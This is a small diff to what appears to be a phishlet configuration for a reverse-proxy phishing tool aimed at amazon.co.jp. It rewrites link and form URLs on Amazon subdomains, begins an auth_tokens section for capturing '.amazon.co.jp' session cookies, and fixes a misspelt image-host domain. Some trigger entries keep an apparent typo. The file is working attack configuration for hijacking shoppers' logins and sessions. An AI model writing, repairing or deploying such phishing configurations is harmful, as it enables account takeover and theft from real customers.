@@ -9,7 +9,7 @@ sub_filters:
   - {triggers_on: 'www.amazon.co.jp', orig_sub: 'www', domain: 'amazon.co.jp', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'fls-fe.amazon.co.jp', orig_sub: 'fls-fe', domain: 'amazon.co.jp', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'fls-fe.amazon.co.jp', orig_sub: 'fls-fe', domain: 'amazon.co.jp', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'images-fe.ssl-iamges-amazon.com', orig_sub: 'images-fe', domain: 'ssl-iges-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-fe.ssl-iamges-amazon.com', orig_sub: 'images-fe', domain: 'ssl-images-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'images-fe.ssl-iamges-amazon.com', orig_sub: 'images-fe', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
 auth_tokens:
   - domain: '.amazon.co.jp'
